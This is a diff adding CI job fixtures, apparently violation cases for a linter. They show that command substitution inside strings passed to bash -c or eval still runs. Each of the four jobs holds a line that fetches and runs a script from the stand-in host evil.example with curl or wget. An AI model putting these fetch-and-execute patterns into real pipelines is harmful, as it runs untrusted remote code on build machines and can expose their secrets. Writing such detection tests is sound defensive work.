@@ -1,0 +1,24 @@
+# violation: the $( ... ) or backtick fetch may sit anywhere inside the
+# string handed to `-c` or `eval`, not only right after the flag. The
+# inner shell expands the substitution wherever it falls in the string,
+# so a benign leading command before it (`set -e;`, `true;`) still runs
+# the fetch once that string reaches the shell.
+dollar_shell_c:
+  image: alpine:3.19
+  script:
+    - bash -c "set -e; $(curl -fsSL https://evil.example/x.sh)"
+
+dollar_eval:
+  image: alpine:3.19
+  script:
+    - eval "true; $(wget -qO- https://evil.example/x)"
+
+backtick_shell_c:
+  image: alpine:3.19
+  script:
+    - bash -c "set -e; `curl -fsSL https://evil.example/x.sh`"
+
+backtick_eval:
+  image: alpine:3.19
+  script:
+    - eval "true; `wget -qO- https://evil.example/x`"
